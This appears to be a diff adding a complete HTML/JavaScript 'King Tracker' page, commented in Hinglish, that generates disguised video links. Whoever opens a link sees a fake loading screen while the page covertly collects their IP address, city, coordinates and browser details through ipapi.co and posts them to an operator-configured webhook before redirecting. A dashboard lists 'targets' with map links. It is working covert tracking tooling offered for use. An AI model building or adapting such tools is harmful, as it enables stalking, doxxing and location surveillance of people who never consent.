@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>King Tracker</title> <!-- Title updated to King Tracker -->
+    <style>
+        :root {
+            --primary: #00ff41;
+            /* Hacker Green */
+            --secondary: #008f11;
+            --accent: #ff003c;
+            /* Cyber Red */
+            --bg: #0b0e14;
+            --card-bg: rgba(255, 255, 255, 0.05);
+        }
+
+        @keyframes rgb-border {
+            0% {
+                border-color: #ff0000;
+                box-shadow: 0 0 10px #ff0000;
+            }
+
+            33% {
+                border-color: #00ff00;
+                box-shadow: 0 0 10px #00ff00;
+            }
+
+            66% {
+                border-color: #0000ff;
+                box-shadow: 0 0 10px #0000ff;
+            }
+
+            100% {
+                border-color: #ff0000;
+                box-shadow: 0 0 10px #ff0000;
+            }
+        }
+
+        @keyframes gradient-text {
+            0% {
+                background-position: 0% 50%;
+            }
+
+            50% {
+                background-position: 100% 50%;
+            }
+
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: var(--bg);
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            overflow-x: hidden;
+        }
+
+        nav {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .nav-btn {
+            background: var(--card-bg);
+            border: 1px solid var(--primary);
+            color: var(--primary);
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: 0.3s;
+            font-weight: bold;
+        }
+
+        .nav-btn.active {
+            background: var(--primary);
+            color: #000;
+            box-shadow: 0 0 15px var(--primary);
+        }
+
+        .container {
+            background: var(--card-bg);
+            backdrop-filter: blur(10px);
+            border: 2px solid transparent;
+            animation: rgb-border 5s infinite linear;
+            padding: 30px;
+            border-radius: 20px;
+            text-align: center;
+            width: 90%;
+            max-width: 400px;
+            margin: 20px;
+            display: none;
+            /* Controlled by JS */
+        }
+
+        .container.active {
+            display: block;
+        }
+
+        h2 {
+            font-size: 2.2rem;
+            margin-bottom: 20px;
+            background: linear-gradient(to right, var(--primary), #fff, var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-size: 200% auto;
+            animation: gradient-text 3s infinite linear;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 15px 0;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 8px;
+            box-sizing: border-box;
+            color: white;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        input:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 15px var(--primary);
+        }
+
+        button {
+            background: linear-gradient(45deg, var(--secondary), #000);
+            border: 1px solid var(--primary);
+            color: white;
+            border: none;
+            padding: 15px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 18px;
+            font-weight: bold;
+            text-transform: uppercase;
+            transition: 0.3s;
+            box-shadow: 0 4px 15px rgba(0, 255, 65, 0.2);
+        }
+
+        button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px var(--primary);
+        }
+
+        #result {
+            margin-top: 20px;
+            word-wrap: break-word;
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            display: none;
+            text-align: left;
+            border-left: 4px solid var(--primary);
+        }
+
+        #result strong {
+            color: var(--primary);
+        }
+
+        #generatedLink {
+            color: #fff;
+            font-weight: bold;
+            font-size: 0.9rem;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        #redirect-ui {
+            text-align: center;
+            color: #fff;
+        }
+
+        #redirect-ui h1 {
+            color: var(--primary);
+            text-shadow: 0 0 20px var(--primary);
+        }
+
+        .admin-section {
+            margin-top: 30px;
+            width: 90%;
+            max-width: 800px;
+            background: var(--card-bg);
+            backdrop-filter: blur(10px);
+            padding: 20px;
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            margin-bottom: 50px;
+            display: none;
+        }
+
+        .admin-section.active {
+            display: block;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 15px;
+            font-size: 13px;
+        }
+
+        th,
+        td {
+            padding: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            text-align: left;
+        }
+
+        th {
+            background-color: rgba(0, 255, 65, 0.1);
+            color: var(--primary);
+        }
+
+        #logTable tbody tr:hover {
+            background-color: rgba(0, 255, 65, 0.05);
+            cursor: pointer;
+        }
+
+        .watch-btn {
+            background: var(--accent);
+            color: white;
+            padding: 5px 10px;
+            border-radius: 4px;
+            text-decoration: none;
+            font-size: 11px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <nav>
+        <button class="nav-btn active" onclick="showSection('main-ui', this)">Link Creator</button>
+        <button class="nav-btn" onclick="showSection('admin-dashboard', this)">King Dashboard</button>
+    </nav>
+
+    <div class="container active" id="main-ui">
+        <h2>King Tracker</h2>
+        <p style="color: #888;">Generate tracking link for any video</p>
+
+        <input type="text" id="linkName" placeholder="Link ka naam (e.g., Target 1)">
+        <input type="url" id="videoUrl" placeholder="Video URL (e.g., YouTube Link)">
+        <input type="text" id="loadingText" placeholder="Custom loading message (Optional)">
+
+        <button onclick="generateLink()">Link Banayein</button>
+
+        <div id="result">
+            <strong>Aapka Tracking Link:</strong><br>
+            <div style="display: flex; flex-direction: column; gap: 10px; margin-top: 10px;">
+                <a id="generatedLink" href="#" target="_blank"
+                    style="word-break: break-all; color: var(--primary); text-decoration: underline; font-size: 0.8rem;"></a>
+                <button onclick="copyLink()" id="copyBtn"
+                    style="padding: 8px; font-size: 14px; background: var(--primary); color: #000;">
+                    Copy Link
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Admin Dashboard Section -->
+    <div class="admin-section" id="admin-dashboard">
+        <h3>King Dashboard (Recent Activity)</h3>
+        <p style="font-size: 0.8em; color: #888;">Click on row to see Location Map. Use 'Watch' to see target video.</p>
+        <div style="overflow-x: auto;">
+            <table id="logTable">
+                <thead>
+                    <tr>
+                        <th>Name</th>
+                        <th>IP Address</th>
+                        <th>Location</th>
+                        <th>Time</th>
+                        <th>Action</th>
+                    </tr>
+                </thead>
+                <tbody id="logBody">
+                    <!-- Logs will appear here -->
+                </tbody>
+            </table>
+        </div>
+        <button onclick="openWebhookDashboard()" style="margin-top: 10px;">Open Real-Time Webhook Panel</button>
+    </div>
+
+    <!-- Redirecting Message (Initially Hidden) -->
+    <div id="redirect-ui" class="hidden">
+        <h1 id="redirect-header">Video Load Ho Raha Hai...</h1>
+        <p id="redirect-subtext">Kripya intezaar karein.</p>
+    </div>
+
+    <script>
+        // --- Configuration ---
+        // Aapko apni location details receive karne ke liye ek 'Webhook' ya API ki zarurat hogi.
+        // Aap 'https://webhook.site' se ek URL le kar yahan paste kar sakte hain.
+        // Jab koi aapka link kholega, uski details is URL par bhej di jayengi.
+        const WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE"; // Yahan apna Webhook URL daalein!
+
+        function showSection(id, btn) {
+            document.querySelectorAll('.container, .admin-section').forEach(el => el.classList.remove('active'));
+            document.querySelectorAll('.nav-btn').forEach(el => el.classList.remove('active'));
+
+            document.getElementById(id).classList.add('active');
+            btn.classList.add('active');
+
+            if (id === 'admin-dashboard') loadLocalLogs();
+        }
+
+        function openWebhookDashboard() {
+            if (WEBHOOK_URL.includes("YOUR_WEBHOOK_URL")) { alert("Pehle apna Webhook URL code mein daalein!"); return; }
+            const dashboardUrl = WEBHOOK_URL.replace('https://webhook.site/', 'https://webhook.site/#!/');
+            window.open(dashboardUrl, '_blank');
+        }
+
+        function generateLink() {
+            const videoUrl = document.getElementById('videoUrl').value;
+            if (!videoUrl) {
+                alert("Kripya video link daalein!");
+                return;
+            }
+
+            const linkName = document.getElementById('linkName').value || 'Unnamed';
+            const loadingMsg = document.getElementById('loadingText').value || 'Video Load Ho Raha Hai...';
+
+            // Create config object
+            const config = {
+                u: videoUrl,
+                n: linkName,
+                m: loadingMsg
+            };
+
+            const baseUrl = window.location.href.split('?')[0];
+
+            // Agar aap local file use kar rahe hain (file://), to apps ise link nahi manenge.
+            // Isko host karna zaroori hai (GitHub Pages/Netlify par).
+            if (baseUrl.startsWith('file:///')) {
+                alert("Warning: Aap local file use kar rahe hain. Ye link sirf aapke computer par chalega. Isse internet par chalane ke liye GitHub ya Netlify par host karein.");
+            }
+
+            const encodedData = btoa(unescape(encodeURIComponent(JSON.stringify(config))));
+            const trackingLink = `${baseUrl}?data=${encodedData}`;
+
+            document.getElementById('result').style.display = 'block';
+            document.getElementById('generatedLink').innerText = trackingLink;
+            document.getElementById('generatedLink').href = trackingLink;
+            document.getElementById('copyBtn').innerText = "Copy Link";
+        }
+
+        function copyLink() {
+            const link = document.getElementById('generatedLink').href;
+            navigator.clipboard.writeText(link).then(() => {
+                const btn = document.getElementById('copyBtn');
+                btn.innerText = "Copied! ✅";
+                setTimeout(() => btn.innerText = "Copy Link", 2000);
+            });
+        }
+
+        // --- Tracking Logic ---
+        window.onload = function () {
+            const urlParams = new URLSearchParams(window.location.search);
+            const dataEncoded = urlParams.get('data');
+
+            if (dataEncoded) {
+                try {
+                    // Unicode support ke liye safe decoding
+                    const config = JSON.parse(decodeURIComponent(escape(atob(dataEncoded))));
+
+                    document.getElementById('main-ui').style.display = 'none';
+                    document.querySelector('nav').style.display = 'none';
+                    document.getElementById('admin-dashboard').style.display = 'none';
+                    document.getElementById('redirect-ui').classList.remove('hidden');
+                    document.getElementById('redirect-header').innerText = config.m;
+
+                    const targetUrl = config.u;
+
+                    fetch('https://ipapi.co/json/')
+                        .then(response => response.json())
+                        .then(data => {
+                            const visitorData = {
+                                ip: data.ip,
+                                city: data.city,
+                                region: data.region,
+                                country: data.country_name,
+                                lat: data.latitude,
+                                lon: data.longitude,
+                                link_label: config.n,
+                                redirect_url: targetUrl,
+                                timestamp: new Date().toISOString(),
+                                userAgent: navigator.userAgent
+                            };
+
+                            saveLogLocally(visitorData);
+
+                            if (!WEBHOOK_URL.includes("YOUR_WEBHOOK_URL")) {
+                                return fetch(WEBHOOK_URL, {
+                                    method: 'POST',
+                                    mode: 'no-cors',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify(visitorData)
+                                });
+                            }
+                        })
+                        .catch(err => console.error("Tracking Error:", err))
+                        .finally(() => {
+                            setTimeout(() => {
+                                window.location.href = targetUrl;
+                            }, 1500);
+                        });
+                } catch (e) {
+                    console.error("Invalid data parameter");
+                }
+            } else {
+                loadLocalLogs();
+            }
+        };
+
+        function saveLogLocally(data) {
+            let logs = JSON.parse(localStorage.getItem('king_logs') || '[]');
+            logs.unshift(data);
+            localStorage.setItem('king_logs', JSON.stringify(logs.slice(0, 20)));
+        }
+
+        function loadLocalLogs() {
+            const logs = JSON.parse(localStorage.getItem('king_logs') || '[]');
+            const body = document.getElementById('logBody');
+            body.innerHTML = '';
+            logs.forEach(log => {
+                const mapUrl = (log.lat && log.lon) ? `https://www.google.com/maps?q=${log.lat},${log.lon}` : '#';
+                const row = `<tr>
+                    <td>${log.link_label}</td>
+                    <td>${log.ip}</td>
+                    <td onclick="${mapUrl !== '#' ? `window.open('${mapUrl}', '_blank')` : 'alert(\'Location data missing\')'}" style="text-decoration: underline; color: var(--primary);">${log.city || 'Unknown'}</td>
+                    <td>${new Date(log.timestamp).toLocaleTimeString()}</td>
+                    <td><a href="${log.redirect_url}" target="_blank" class="watch-btn">Watch Video</a></td>
+                </tr>`;
+                body.innerHTML += row;
+            });
+        }
+    </script>
+</body>
+
+</html>
